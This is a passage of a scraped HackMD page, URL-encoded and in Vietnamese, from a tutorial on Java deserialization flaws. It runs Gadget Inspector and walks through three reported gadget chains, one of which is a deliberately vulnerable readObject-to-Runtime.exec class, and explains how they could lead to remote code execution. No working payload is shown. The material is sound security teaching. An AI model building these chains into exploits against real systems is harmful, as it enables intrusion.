(https%3A%2F%2Fhackmd.io%2F_uploads%2FHknuOstdxx.png)%0ASau%20%C4%91%E1%BA%A5y%20ch%C3%BAng%20ta%20v%C3%A0o%20folder%20ch%E1%BB%A9a%20tool%20**Gadget%20Inspector**%20v%C3%A0%20ch%E1%BA%A1y%20%C4%91%E1%BB%83%20n%C3%B3%20ph%C3%A2n%20t%C3%ADch%20b%E1%BA%B1ng%20l%E1%BB%87nh%20m%C3%A0%20m%C3%ACnh%20hay%20d%C3%B9ng%20l%C3%A0%3A%0A%60%60%60java%20-Xmx2g%20-jar%20gadget-inspector-all.jar%20app.jar%20libs.jar%60%60%60%0Al%C3%A0%20c%C3%B4ng%20c%E1%BB%A5%20n%C3%A0y%20s%E1%BA%BD%20ph%C3%A2n%20t%C3%ADch%20t%C3%ACm%20**gadget%20chain**%20%E1%BB%9F%202%20file%20**app.jar**%20v%C3%A0%20**lib.jar**%20do%20m%C3%ACnh%20t%E1%BA%A1o%20t%C6%B0%C6%A1ng%20%E1%BB%A9ng%20v%E1%BB%9Bi%20**source**%20v%C3%A0%20th%C6%B0%20vi%E1%BB%87n%20m%C3%ACnh%20x%C3%A0i.%0AKhi%20ch%E1%BA%A1y%20xong%20th%C3%AC%20c%C3%A1c%20b%E1%BA%A1n%20s%E1%BA%BD%20th%E1%BA%A5y%20tool%20tr%E1%BA%A3%20v%E1%BB%81%20nh%C6%B0%20n%C3%A0y%3A%0A!%5Bimage%5D(https%3A%2F%2Fhackmd.io%2F_uploads%2FH1BWcTKOel.png)%0A!%5Bimage%5D(https%3A%2F%2Fhackmd.io%2F_uploads%2FrJHz5pYuge.png)%0A%0AT%E1%BB%AB%20th%C3%B4ng%20b%C3%A1o%20tr%E1%BA%A3%20v%E1%BB%81%20sau%20khi%20ch%E1%BA%A1y%20th%C3%AC%20ta%20c%C3%B3%20th%C3%B4ng%20b%C3%A1o%20l%C3%A0%20c%C3%B3%20**3%20gadget%20chain**%20t%C3%ACm%20%C4%91%C6%B0%E1%BB%A3c%20v%C3%A0%20tr%E1%BA%A3%20th%C3%AAm%20m%E1%BB%99t%20s%E1%BB%91%20file%2C%20nh%C6%B0ng%20hi%E1%BB%87n%20gi%E1%BB%9D%20m%C3%ACnh%20ch%E1%BB%89%20%C4%91i%20c%C6%A1%20b%E1%BA%A3n%20c%E1%BB%A7a%20tool%20n%C3%A0y%20th%C3%AC%20quan%20t%C3%A2m%20file%20**gadget-chains.txt**%20l%C3%A0%20%C4%91%C6%B0%E1%BB%A3c%20v%C3%A0%20n%C3%B3%20c%C3%B3%20n%E1%BB%99i%20dung%20l%C3%A0%3A%0A%60%60%60code%0Aorg%2Fapache%2Flog4j%2Fpattern%2FLogEvent.readObject(Ljava%2Fio%2FObjectInputStream%3B)V%20(1)%0A%20%20org%2Fapache%2Flog4j%2Fpattern%2FLogEvent.readLevel(Ljava%2Fio%2FObjectInputStream%3B)V%20(1)%0A%20%20java%2Flang%2Freflect%2FMethod.invoke(Ljava%2Flang%2FObject%3B%5BLjava%2Flang%2FObject%3B)Ljava%2Flang%2FObject%3B%20(0)%0A%0Aorg%2Fapache%2Flog4j%2Fspi%2FLoggingEvent.readObject(Ljava%2Fio%2FObjectInputStream%3B)V%20(1)%0A%20%20org%2Fapache%2Flog4j%2Fspi%2FLoggingEvent.readLevel(Ljava%2Fio%2FObjectInputStream%3B)V%20(1)%0A%20%20java%2Flang%2Freflect%2FMethod.invoke(Ljava%2Flang%2FObject%3B%5BLjava%2Flang%2FObject%3B)Ljava%2Flang%2FObject%3B%20(0)%0A%0Acom%2Fexample%2Fvuln%2FDangerousAction.readObject(Ljava%2Fio%2FObjectInputStream%3B)V%20(1)%0A%20%20java%2Flang%2FRuntime.exec(Ljava%2Flang%2FString%3B)Ljava%2Flang%2FProcess%3B%20(1)%0A%60%60%60%0Ath%C3%AC%20gi%E1%BB%9D%20m%C3%ACnh%20s%E1%BA%BD%20ph%C3%A2n%20t%C3%ADch%20c%E1%BA%A5u%20tr%C3%BAc%20c%E1%BB%A7a%20n%C3%B3%2C%20th%C3%AC%20m%E1%BB%97i%20**block**%20%E1%BB%9F%20%C4%91%C3%A2y%20l%C3%A0%20m%E1%BB%99t%20**gadget%20chain**%20v%C3%A0%20n%C3%B3%20%C4%91%C6%B0%E1%BB%A3c%20ng%C4%83n%20c%C3%A1ch%20v%E1%BB%9Bi%20nhau%20b%E1%BA%B1ng%20d%E1%BA%A5u%20c%C3%A1ch.%20M%E1%BB%97i%20d%C3%B2ng%20%C4%91%E1%BA%A7u%20ti%C3%AAn%20trong%20**block**%20l%C3%A0%20l%C3%A0%20**entry%20point**(ph%C6%B0%C6%A1ng%20th%E1%BB%A9c%20c%C3%B3%20th%E1%BB%83%20b%E1%BB%8B%20g%E1%BB%8Di%20khi%20deserialization%20di%E1%BB%85n%20ra)%2C%20n%C3%B3%20c%C3%B3%20c%E1%BA%A5u%20tr%C3%BAc%3A%0A%60%60%60java%0A%20%20%20%20%3Cpackage%3E%2F%3Cclass%3E.%3Cmethod%3E(%3Cmethod_signature%3E)%20(1)%0A%0A%60%60%60%0Ac%C3%B2n%20k%C3%AD%20hi%E1%BB%87u%20%60%60%60(1)%60%60%60%20ngh%C4%A9a%20l%C3%A0%20ph%C6%B0%C6%A1ng%20th%E1%BB%A9c%20n%C3%A0y%20c%C3%B3%20th%E1%BB%83%20**nh%E1%BA%ADn%20d%E1%BB%AF%20li%E1%BB%87u%20t%E1%BB%AB%20%C4%91%E1%BB%91i%20t%C6%B0%E1%BB%A3ng%20%C4%91%C6%B0%E1%BB%A3c%20deserialize%20(Source)**.%20C%C3%A1c%20d%C3%B2ng%20ti%E1%BA%BFp%20theo%20l%C3%A0%20lu%E1%BB%93ng%20th%E1%BB%B1c%20thi%20ti%E1%BA%BFp%20theo%20v%C3%A0%20d%C3%B2ng%20cu%E1%BB%91i%20s%E1%BA%BD%20l%C3%A0%20**Sink**.%0A%20%20%20%20%20%20%20%20%0A%C4%90%E1%BB%83%20hi%E1%BB%83u%20r%C3%B5%20h%C6%A1n%20gi%E1%BB%9D%20m%C3%ACnh%20s%E1%BA%BD%20ph%C3%A2n%20t%C3%ADch%20c%E1%BA%A3%203%20**Chain**%3A%0A**Chain%201%3A**%0A%60%60%60java%0Aorg%2Fapache%2Flog4j%2Fpattern%2FLogEvent.readObject(Ljava%2Fio%2FObjectInputStream%3B)V%20(1)%0A%20%20org%2Fapache%2Flog4j%2Fpattern%2FLogEvent.readLevel(Ljava%2Fio%2FObjectInputStream%3B)V%20(1)%0A%20%20java%2Flang%2Freflect%2FMethod.invoke(Ljava%2Flang%2FObject%3B%5BLjava%2Flang%2FObject%3B)Ljava%2Flang%2FObject%3B%20(0)%0A%60%60%60%0A-%20Entry%20point%3A%20%60%60%60LogEvent.readObject%60%60%60%20%C4%91%C6%B0%E1%BB%A3c%20g%E1%BB%8Di%20khi%20**deserialize**%20%C4%91%E1%BB%91i%20t%C6%B0%E1%BB%A3ng%20%60%60%60LogEvent%60%60%60%20t%E1%BB%AB%20%60%60%60Log4j%60%60%60%0A-%20R%E1%BB%93i%20t%E1%BB%AB%20%C4%91%C3%A2y%20g%E1%BB%8Di%20t%E1%BB%9Bi%20%60%60%60readLevel%60%60%60%2C%20v%C3%A0%20ti%E1%BA%BFp%20t%E1%BB%A5c%20g%E1%BB%8Di%20%C4%91%C6%B0%E1%BB%A3c%20%60%60%60Method.invoke%60%60%60(reflection)%2C%20cho%20ph%C3%A9p%20th%E1%BB%B1c%20thi%20h%C3%A0m%20t%C3%B9y%20%C3%BD%2C%20r%E1%BB%93i%20t%E1%BB%AB%20%C4%91%C3%A2y%20b%E1%BA%A1n%20c%C3%B3%20th%E1%BB%83%20ki%E1%BA%BFm%20c%C3%A1c%20h%C3%A0m%20m%C3%A0%20m%C3%ACnh%20mu%E1%BB%91n%20v%C3%AC%20b%C3%A2y%20gi%E1%BB%9D%20m%C3%ACnh%20c%C3%B3%20th%E1%BB%83%20th%E1%BB%B1c%20thi%20t%C3%B9y%20%C3%BD%20r%E1%BB%93i.%0A%0A**Chain%202%3A**%0A%60%60%60java%0Aorg%2Fapache%2Flog4j%2Fspi%2FLoggingEvent.readObject(Ljava%2Fio%2FObjectInputStream%3B)V%20(1)%0A%20%20org%2Fapache%2Flog4j%2Fspi%2FLoggingEvent.readLevel(Ljava%2Fio%2FObjectInputStream%3B)V%20(1)%0A%20%20java%2Flang%2Freflect%2FMethod.invoke(Ljava%2Flang%2FObject%3B%5BLjava%2Flang%2FObject%3B)Ljava%2Flang%2FObject%3B%20(0)%0A%60%60%60%0A-%20Entry%20point%3A%20LoggingEvent.readObject%20c%C5%A9ng%20%C4%91%C6%B0%E1%BB%A3c%20g%E1%BB%8Di%20khi%20**deserialize**%20%C4%91%E1%BB%91i%20t%C6%B0%E1%BB%A3ng%20%60%60%60LogEvent%60%60%60%20t%E1%BB%AB%20%60%60%60Log4j%60%60%60.%0A-%20Th%C3%AC%20chain%20n%C3%A0y%20c%C5%A9ng%20t%C6%B0%C6%A1ng%20t%E1%BB%B1%20chain%201%20nh%C6%B0ng%20kh%C3%A1c%20class(%60%60%60spi.LoggingEvent%60%60%60%20thay%20v%C3%AC%20%60%60%60pattern.LogEvent%60%60%60)%0A%20%20%20%20%20%20%20%0A**Chain%203%3A**%0A%60%60%60java%0Acom%2Fexample%2Fvuln%2FDangerousAction.readObject(Ljava%2Fio%2FObjectInputStream%3B)V%20(1)%0A%20%20java%2Flang%2FRuntime.exec(Ljava%2Flang%2FString%3B)Ljava%2Flang%2FProcess%3B%20(1)%0A%60%60%60%0AChain%20n%C3%A0y%20m%C3%ACnh%20%C4%91%C3%A3%20l%C3%A0m%20v%C3%A0%20ph%C3%A2n%20t%C3%ADch%20ngay%20t%E1%BB%AB%20%C4%91%E1%BA%A7u%20th%C3%AC%20m%C3%ACnh%20s%E1%BA%BD%20kh%C3%B4ng%20ph%C3%A2n%20t%C3%ADch%20s%C3%A2u%20n%E1%BB%AFa%2C%20th%C3%AC%20v%E1%BA%ABn%20l%C3%A0%3A%0A-%20Entry%20point%3A%20DangerousAction.readObject%20(class%20c%E1%BB%A7a%20server).%0A-%20Sau%20%C4%91%E1%BA%A5y%20g%E1%BB%8Di%20tr%E1%BB%B1c%20ti%E1%BA%BFp%20%60%60%60Runtime.exec%60%60%60%20v%E1%BB%9Bi%20input%20t%E1%BB%AB%20serialized%20data.%0A-%20(1)%20%E1%BB%9F%20cu%E1%BB%91i%20ngh%C4%A9a%20l%C3%A0%20d%E1%BB%AF%20li%E1%BB%87u%20ng%C6%B0%E1%BB%9Di%20d%C3%B9ng%20truy%E1%BB%81n%20v%C3%A0o%20exec%20tr%E1%BB%B1c%20ti%E1%BA%BFp%20t%E1%BB%AB%20input%20c%C3%B3%20ngh%C4%A9a%20ta%20c%C3%B3%20th%E1%BB%83%20**RCE%20t%C3%B9y%20%C3%BD**.%0A%0ATh%C3%AC%20%E1%BB%9F%20**Chain%201**%20v%C3%A0%20**Chain%202**%20l%C3%A0%202%20chain%20ti%E1%BB%81m%20%E1%BA%A9n%20kh%E1%BA%A3%20n%C4%83ng%20RCE%2C%20ch%C3%BAng%20ta%20v%E1%BA%ABn%20ph%E1%BA%A3i%20t%E1%BB%B1%20ho%C3%A0n%20thi%E1%BB%87n%20th%C3%AAm%20kh%C3%B4ng%20gi%E1%BB%91ng%20nh%C6%B0%20**Chain%203**.%0A%20%20%20%20%20%20%20%20%0AM%E1%BA%B7c%20d%C3%B9%20tool%20n%C3%A0y%20kh%C3%A1%20h%E1%BB%AFu%20%C3%ADch%20nh%C6%B0ng%20v%E1%BA%ABn%20c%C3%B3%20kh%E1%BA%A3%20n%C4%83ng%20thi%E1%BA%BFu%20s%C3%B3t%20chain%20v%C3%AD%20d%E1%BB%A5%20nh%C6%B0%20kh%C3%B4ng%20t%C3%ACm%20th%E1%BA%A5y%20**CC6**%20%E1%BB%9F%20v%C3%AD%20d%E1%BB%A5%20th%E1%BB%A9%202%20c%E1%BB%A7a%20m%C3%ACnh%20v%C3%A0%20c%C3%A1c%20b%E1%BA%A1n%20c%C5%A9ng%20n%C3%AAn%20test%20l%E1%BA%A1i%20c%C3%A1c%20Gadget%20n%C3%A0y%2C%20v%C3%A0%20%C4%91%C3%B4i%20khi%20ph%E1%BA%A3i%20t%E1%BB%B1%20x%C3%A1c%20%C4%91%E1%BB%8Bnh%20**Source**%20v%C3%A0%20**Sink**%20b%E1%BA%B1ng%20th%E1%BB%A7%20c%C3%B4ng%2C%20kh%C3%B4ng%20n%C3%AAn%20qu%C3%A1%20ph%E1%BB%A5%20thu%E1%BB%99c%20v%C3%A0o%20c%C3%B4ng%20c%E1%BB%A5%20n%C3%A0y.","viewMode":"publish","isOwner":false,"isSignIn":false,"isLiked":false,"isBookmarked":false,"publishType":"view","commentCount":0,"isNotesRecommendationsEnabled":true,"recommendedNotes":[],"lastChangeUserInfo":{"name":"ASEN","path":"nhat015","avatarUrl":"data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iVVRGLTgiIHN0YW5kYWxvbmU9Im5vIj8%2BPHN2ZyB4bWxuczpyZGY9Imh0dHA6Ly93d3cudzMub3JnLzE5OTkvMDIvMjItcmRmLXN5bnRheC1ucyMiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgaGVpZ2h0PSI5NiIgd2lkdGg9Ijk2IiB2ZXJzaW9uPSIxLjEiIHZpZXdCb3g9IjAgMCA5NiA5NiI%2BPGc%2BPHJlY3Qgd2lkdGg9Ijk2IiBoZWlnaHQ9Ijk2IiBmaWxsPSIjYzYzZjU2IiAvPjx0ZXh0IGZvbnQtc2l6ZT0iNjRweCIgZm9udC1mYW1pbHk9InNhbnMtc2VyaWYiIHRleHQtYW5jaG9yPSJtaWRkbGUiIGZpbGw9IiNmZmZmZmYiPjx0c3BhbiB4PSI0OCIgeT0iNzIiIHN0cm9rZS13aWR0aD0iLjI2NDU4cHgiIGZpbGw9IiNmZmZmZmYiPkE8L3RzcGFuPjwvdGV4dD48L2c%2BPC9zdmc%2B"}}`);
  (function () {
    const decodeStringProps = (props) => {
      for (const key in props) {
        if (typeof props[key] === 'string') {
          props[key] = decodeURIComponent(props[key])
        } else if (typeof props[key] === 'object') {
          decodeStringProps(props[key])
        }
      }
    }
    decodeStringProps(window.publishProps)
  })()
</script>

    <script src="./Những điểu về lỗ hổng Java Deserialization vulnerability - HackMD_files/embed.js.tải xuống"></script><style>@keyframes _spin_evhv6_1{0%{transform:rotate(0)}to{transform:rotate(360deg)}}@keyframes _wave_evhv6_1{0%{transform:rotate(0)}50%{transform:rotate(20deg)}to{transform:rotate(0)}}@keyframes _heartBeat_evhv6_1{0%{transform:scale(1)}50%{transform:scale(1.08)}to{transform:scale(1)}}@keyframes _flash_evhv6_1{0%,50%,to{opacity:1}25%,75%{opacity:.2}}@keyframes _bounce_evhv6_1{0%,20%,53%,to{transform:translateZ(0)}40%,43%{transform:translate3d(0,-30px,0) scaleY(1.1)}70%{transform:translate3d(0,-15px,0) scaleY(1.05)}80%{transform:translateZ(0) scaleY(.95)}90%{transform:translate3d(0,-4px,0) scaleY(1.02)}}@keyframes _rubberBand_evhv6_1{0%{transform:scaleZ(1)}30%{transform:scale3d(1.25,.75,1)}40%{transform:scale3d(.75,1.25,1)}50%{transform:scale3d(1.15,.85,1)}65%{transform:scale3d(.95,1.05,1)}75%{transform:scale3d(1.05,.95,1)}to{transform:scaleZ(1)}}@keyframes _headShake_evhv6_1{0%{transform:translate(0)}6.5%{transform:translate(-6px) rotateY(-9deg)}18.5%{transform:translate(5px) rotateY(7deg)}31.5%{transform:translate(-3px) rotateY(-5deg)}43.5%{transform:translate(2px) rotateY(3deg)}50%{transform:translate(0)}}@keyframes _tada_evhv6_1{0%{transform:scaleZ(1)}10%,20%{transform:scale3d(.9,.9,.9) rotate3d(0,0,1,-3deg)}30%,50%,70%,90%{transform:scale3d(1.1,1.1,1.1) rotate3d(0,0,1,3deg)}40%,60%,80%{transform:scale3d(1.1,1.1,1.1) rotate3d(0,0,1,-3deg)}to{transform:scaleZ(1)}}._overlay_evhv6_157{position:fixed;inset:0;z-index:1000000006;display:-ms-flexbox;display:flex;-ms-flex-pack:center;justify-content:center;-ms-flex-align:center;align-items:center;background-color:#0f0f0f99}._layoutDefault_evhv6_170{position:fixed;right:20px;bottom:20px;z-index:2147483000;width:auto;height:auto;max-width:95vw;display:-ms-flexbox;display:flex;background-color:transparent;border-radius:5px;box-shadow:#0f0f0f0d 0 0 0 1px,#0f0f0f1a 0 3px 6px,#0f0f0f33 0 9px 24px;opacity:0}._layoutModal_evhv6_186{position:relative;z-index:2147483000;width:700px;height:auto;max-width:95vw;display:-ms-flexbox;display:flex;background-color:transparent;border-radius:5px;box-shadow:#0f0f0f0d 0 0 0 1px,#0f0f0f1a 0 3px 6px,#0f0f0f33 0 9px 24px;opacity:0}._popupContainer_evhv6_200{display:-ms-flexbox;display:flex;width:100%;border-radius:5px;overflow-y:auto}._popupContainer_evhv6_200 iframe{border-radius:5px;max-height:95vh}._loadingIndicator_evhv6_212{position:absolute;z-index:2147483000;display:-ms-inline-flexbox;display:inline-flex;-ms-flex-align:center;align-items:center;-ms-flex-pack:center;justify-content:center;width:50px;height:50px;border-radius:50%;color:#444;background-color:#f5f5f5}._loadingIndicatorNoOverlay_evhv6_225{position:fixed;right:10px;bottom:10px}._loadingIndicator_evhv6_212 svg{width:20px;height:20px;animation:_spin_evhv6_1 1.618s linear infinite}._emoji_evhv6_237{position:absolute;top:-21px;left:-21px;display:inline-block;font-size:42px;line-height:1}._animate__wave_evhv6_246{animation:_wave_evhv6_1 1s ease-in-out 20}._animate__heart-beat_evhv6_250{animation:_heartBeat_evhv6_1 1.3s ease-in-out 20}._animate__flash_evhv6_254{animation:_flash_evhv6_1 2.5s 20}._animate__bounce_evhv6_258{animation:_bounce_evhv6_1 1.5s 20;-ms-transform-origin:center bottom;transform-origin:center bottom}._animate__rubber-band_evhv6_263{animation:_rubberBand_evhv6_1 1.5s 20}._animate__head-shake_evhv6_267{animation:_headShake_evhv6_1 1.5s ease-in-out 20}._animate__tada_evhv6_271{animation:_tada_evhv6_1 1.5s 20}._animate__spin_evhv6_275{animation:_spin_evhv6_1 1.618s linear 20}@media (max-height: 1000px){._popupContainer_evhv6_200 iframe{max-height:85vh}}@media (max-width: 576px){._popupContainer_evhv6_200 iframe{max-height:70vh}._layoutDefault_evhv6_170,._layoutModal_evhv6_186{max-width:calc(100% - 40px)}}
/*$vite$:1*/</style>

    
<style></style><link rel="stylesheet" type="text/css" href="./Những điểu về lỗ hổng Java Deserialization vulnerability - HackMD_files/fretboard.7a98c97ae43fb8ca354b.css"><style id="googleidentityservice_button_styles" nonce="">.qJTHM{-webkit-user-select:none;color:#202124;direction:ltr;-webkit-touch-callout:none;font-family:"Roboto-Regular",arial,sans-serif;-webkit-font-smoothing:antialiased;font-weight:400;margin:0;overflow:hidden;-webkit-text-size-adjust:100%}.ynRLnc{left:-9999px;position:absolute;top:-9999px}.L6cTce{display:none}.bltWBb{overflow-wrap:break-word;word-break:break-word}.hSRGPd{color:#1a73e8;cursor:pointer;font-weight:500;text-decoration:none}.Bz112c-W3lGp{height:16px;width:16px}.Bz112c-E3DyYd{height:20px;width:20px}.Bz112c-r9oPif{height:24px;width:24px}.Bz112c-u2z5K{height:36px;width:36px}.Bz112c-uaxL4e{-webkit-border-radius:10px;border-radius:10px}.LgbsSe-Bz112c{display:block}.S9gUrf-YoZ4jf,.S9gUrf-YoZ4jf *{border:none;margin:0;padding:0}.fFW7wc-ibnC6b>.aZ2wEe>div{border-color:#4285f4}.P1ekSe-ZMv3u{-webkit-transition:height linear 200ms;-webkit-transition:height linear 200ms;transition:height linear 200ms}.P1ekSe-ZMv3u>div:nth-child(1){background-color:#1a73e8!important;-webkit-transition:width linear 300ms;-webkit-transition:width linear 300ms;transition:width linear 300ms}.P1ekSe-ZMv3u>div:nth-child(2),.P1ekSe-ZMv3u>div:nth-child(3){background-image:linear-gradient(to right,rgba(255,255,255,.7),rgba(255,255,255,.7)),linear-gradient(to right,#1a73e8,#1a73e8)!important}.haAclf{display:inline-block}.nsm7Bb-HzV7m-LgbsSe{border-radius:4px;box-sizing:border-box;-webkit-transition:background-color 0.218s,border-color 0.218s;transition:background-color 0.218s,border-color 0.218s;-webkit-user-select:none;-webkit-appearance:none;background-color:#fff;background-image:none;border:1px solid #dadce0;color:#3c4043;cursor:pointer;font-family:"Google Sans",arial,sans-serif;font-size:14px;height:40px;letter-spacing:0.25px;outline:none;overflow:hidden;padding:0 12px;position:relative;text-align:center;vertical-align:middle;white-space:nowrap;width:auto}@media screen and (-ms-high-contrast:active){.nsm7Bb-HzV7m-LgbsSe{border:2px solid windowText;color:windowText}}@media screen and (preferes-contrast:more){.nsm7Bb-HzV7m-LgbsSe{color:#000}}.nsm7Bb-HzV7m-LgbsSe.pSzOP-SxQuSe{font-size:14px;height:32px;letter-spacing:0.25px;padding:0 10px}.nsm7Bb-HzV7m-LgbsSe.purZT-SxQuSe{font-size:11px;height:20px;letter-spacing:0.3px;padding:0 8px}.nsm7Bb-HzV7m-LgbsSe.Bz112c-LgbsSe{padding:0;width:40px}.nsm7Bb-HzV7m-LgbsSe.Bz112c-LgbsSe.pSzOP-SxQuSe{width:32px}.nsm7Bb-HzV7m-LgbsSe.Bz112c-LgbsSe.purZT-SxQuSe{width:20px}.nsm7Bb-HzV7m-LgbsSe.JGcpL-RbRzK{border-radius:20px}.nsm7Bb-HzV7m-LgbsSe.JGcpL-RbRzK.pSzOP-SxQuSe{border-radius:16px}.nsm7Bb-HzV7m-LgbsSe.JGcpL-RbRzK.purZT-SxQuSe{border-radius:10px}.nsm7Bb-HzV7m-LgbsSe.MFS4be-Ia7Qfc{border:none;color:#fff}.nsm7Bb-HzV7m-LgbsSe.MFS4be-v3pZbf-Ia7Qfc{background-color:#1a73e8}.nsm7Bb-HzV7m-LgbsSe.MFS4be-JaPV2b-Ia7Qfc{background-color:#202124;color:#e8eaed}@media screen and (prefers-contrast:more){.nsm7Bb-HzV7m-LgbsSe.MFS4be-JaPV2b-Ia7Qfc{color:#fff}}.nsm7Bb-HzV7m-LgbsSe .nsm7Bb-HzV7m-LgbsSe-Bz112c{height:18px;margin-right:8px;min-width:18px;width:18px}.nsm7Bb-HzV7m-LgbsSe.pSzOP-SxQuSe .nsm7Bb-HzV7m-LgbsSe-Bz112c{height:14px;min-width:14px;width:14px}.nsm7Bb-HzV7m-LgbsSe.purZT-SxQuSe .nsm7Bb-HzV7m-LgbsSe-Bz112c{height:10px;min-width:10px;width:10px}.nsm7Bb-HzV7m-LgbsSe.jVeSEe .nsm7Bb-HzV7m-LgbsSe-Bz112c{margin-left:8px;margin-right:-4px}.nsm7Bb-HzV7m-LgbsSe.Bz112c-LgbsSe .nsm7Bb-HzV7m-LgbsSe-Bz112c{margin:0;padding:10px}.nsm7Bb-HzV7m-LgbsSe.Bz112c-LgbsSe.pSzOP-SxQuSe .nsm7Bb-HzV7m-LgbsSe-Bz112c{padding:8px}.nsm7Bb-HzV7m-LgbsSe.Bz112c-LgbsSe.purZT-SxQuSe .nsm7Bb-HzV7m-LgbsSe-Bz112c{padding:4px}.nsm7Bb-HzV7m-LgbsSe .nsm7Bb-HzV7m-LgbsSe-Bz112c-haAclf{border-top-left-radius:3px;border-bottom-left-radius:3px;display:-webkit-box;display:-webkit-flex;display:flex;-webkit-box-pack:center;-webkit-justify-content:center;justify-content:center;-webkit-align-items:center;align-items:center;background-color:#fff;height:36px;margin-left:-10px;margin-right:12px;min-width:36px;width:36px}.nsm7Bb-HzV7m-LgbsSe .nsm7Bb-HzV7m-LgbsSe-Bz112c-haAclf .nsm7Bb-HzV7m-LgbsSe-Bz112c,.nsm7Bb-HzV7m-LgbsSe.Bz112c-LgbsSe .nsm7Bb-HzV7m-LgbsSe-Bz112c-haAclf .nsm7Bb-HzV7m-LgbsSe-Bz112c{margin:0;padding:0}.nsm7Bb-HzV7m-LgbsSe.pSzOP-SxQuSe .nsm7Bb-HzV7m-LgbsSe-Bz112c-haAclf{height:28px;margin-left:-8px;margin-right:10px;min-width:28px;width:28px}.nsm7Bb-HzV7m-LgbsSe.purZT-SxQuSe .nsm7Bb-HzV7m-LgbsSe-Bz112c-haAclf{height:16px;margin-left:-6px;margin-right:8px;min-width:16px;width:16px}.nsm7Bb-HzV7m-LgbsSe.Bz112c-LgbsSe .nsm7Bb-HzV7m-LgbsSe-Bz112c-haAclf{border-radius:3px;margin-left:2px;margin-right:0;padding:0}.nsm7Bb-HzV7m-LgbsSe.JGcpL-RbRzK .nsm7Bb-HzV7m-LgbsSe-Bz112c-haAclf{border-radius:18px}.nsm7Bb-HzV7m-LgbsSe.pSzOP-SxQuSe.JGcpL-RbRzK .nsm7Bb-HzV7m-LgbsSe-Bz112c-haAclf{border-radius:14px}.nsm7Bb-HzV7m-LgbsSe.purZT-SxQuSe.JGcpL-RbRzK .nsm7Bb-HzV7m-LgbsSe-Bz112c-haAclf{border-radius:8px}.nsm7Bb-HzV7m-LgbsSe .nsm7Bb-HzV7m-LgbsSe-bN97Pc-sM5MNb{display:-webkit-box;display:-webkit-flex;display:flex;-webkit-align-items:center;-webkit-box-align:center;align-items:center;-webkit-flex-direction:row;-webkit-box-orient:vertical;-webkit-box-direction:normal;flex-direction:row;-webkit-box-pack:space-between;-webkit-justify-content:space-between;justify-content:space-between;-webkit-flex-wrap:nowrap;flex-wrap:nowrap;height:100%;position:relative;width:100%}.nsm7Bb-HzV7m-LgbsSe .oXtfBe-l4eHX{-webkit-box-pack:center;-webkit-justify-content:center;justify-content:center}.nsm7Bb-HzV7m-LgbsSe .nsm7Bb-HzV7m-LgbsSe-BPrWId{-webkit-flex-grow:1;-webkit-box-flex:1;flex-grow:1;font-family:"Google Sans",arial,sans-serif;font-weight:500;overflow:hidden;text-overflow:ellipsis;vertical-align:top}.nsm7Bb-HzV7m-LgbsSe.purZT-SxQuSe .nsm7Bb-HzV7m-LgbsSe-BPrWId{font-weight:300}.nsm7Bb-HzV7m-LgbsSe .oXtfBe-l4eHX .nsm7Bb-HzV7m-LgbsSe-BPrWId{-webkit-flex-grow:0;-webkit-box-flex:0;flex-grow:0}.nsm7Bb-HzV7m-LgbsSe .nsm7Bb-HzV7m-LgbsSe-MJoBVe{-webkit-transition:background-color 0.218s;transition:background-color 0.218s;bottom:0;left:0;position:absolute;right:0;top:0}.nsm7Bb-HzV7m-LgbsSe:hover,.nsm7Bb-HzV7m-LgbsSe:focus{box-shadow:none;border-color:#d2e3fc;outline:none}.nsm7Bb-HzV7m-LgbsSe:focus-within{outline:2px solid #00639b;border-color:transparent}.nsm7Bb-HzV7m-LgbsSe:hover .nsm7Bb-HzV7m-LgbsSe-MJoBVe{background:rgba(66,133,244,.08)}.nsm7Bb-HzV7m-LgbsSe:active .nsm7Bb-HzV7m-LgbsSe-MJoBVe,.nsm7Bb-HzV7m-LgbsSe:focus .nsm7Bb-HzV7m-LgbsSe-MJoBVe{background:rgba(66,133,244,.1)}.nsm7Bb-HzV7m-LgbsSe.MFS4be-Ia7Qfc:hover .nsm7Bb-HzV7m-LgbsSe-MJoBVe{background:rgba(255,255,255,.24)}.nsm7Bb-HzV7m-LgbsSe.MFS4be-Ia7Qfc:active .nsm7Bb-HzV7m-LgbsSe-MJoBVe,.nsm7Bb-HzV7m-LgbsSe.MFS4be-Ia7Qfc:focus .nsm7Bb-HzV7m-LgbsSe-MJoBVe{background:rgba(255,255,255,.32)}.nsm7Bb-HzV7m-LgbsSe .n1UuX-DkfjY{border-radius:50%;display:-webkit-box;display:-webkit-flex;display:flex;height:20px;margin-left:-4px;margin-right:8px;min-width:20px;width:20px}.nsm7Bb-HzV7m-LgbsSe.jVeSEe .nsm7Bb-HzV7m-LgbsSe-BPrWId{font-family:"Roboto";font-size:12px;text-align:left}.nsm7Bb-HzV7m-LgbsSe.jVeSEe .nsm7Bb-HzV7m-LgbsSe-BPrWId .ssJRIf,.nsm7Bb-HzV7m-LgbsSe.jVeSEe .nsm7Bb-HzV7m-LgbsSe-BPrWId .K4efff .fmcmS{overflow:hidden;text-overflow:ellipsis}.nsm7Bb-HzV7m-LgbsSe.jVeSEe .nsm7Bb-HzV7m-LgbsSe-BPrWId .K4efff{display:-webkit-box;display:-webkit-flex;display:flex;-webkit-align-items:center;-webkit-box-align:center;align-items:center;color:#5f6368;fill:#5f6368;font-size:11px;font-weight:400}.nsm7Bb-HzV7m-LgbsSe.jVeSEe.MFS4be-Ia7Qfc .nsm7Bb-HzV7m-LgbsSe-BPrWId .K4efff{color:#e8eaed;fill:#e8eaed}@media screen and (prefers-contrast:more){.nsm7Bb-HzV7m-LgbsSe.jVeSEe .nsm7Bb-HzV7m-LgbsSe-BPrWId .K4efff,.nsm7Bb-HzV7m-LgbsSe.jVeSEe.MFS4be-Ia7Qfc .nsm7Bb-HzV7m-LgbsSe-BPrWId .K4efff{color:#000;fill:#000}}.nsm7Bb-HzV7m-LgbsSe.jVeSEe .nsm7Bb-HzV7m-LgbsSe-BPrWId .K4efff .Bz112c{height:18px;margin:-3px -3px -3px 2px;min-width:18px;width:18px}.nsm7Bb-HzV7m-LgbsSe.jVeSEe .nsm7Bb-HzV7m-LgbsSe-Bz112c-haAclf{border-top-left-radius:0;border-bottom-left-radius:0;border-top-right-radius:3px;border-bottom-right-radius:3px;margin-left:12px;margin-right:-10px}.nsm7Bb-HzV7m-LgbsSe.jVeSEe.JGcpL-RbRzK 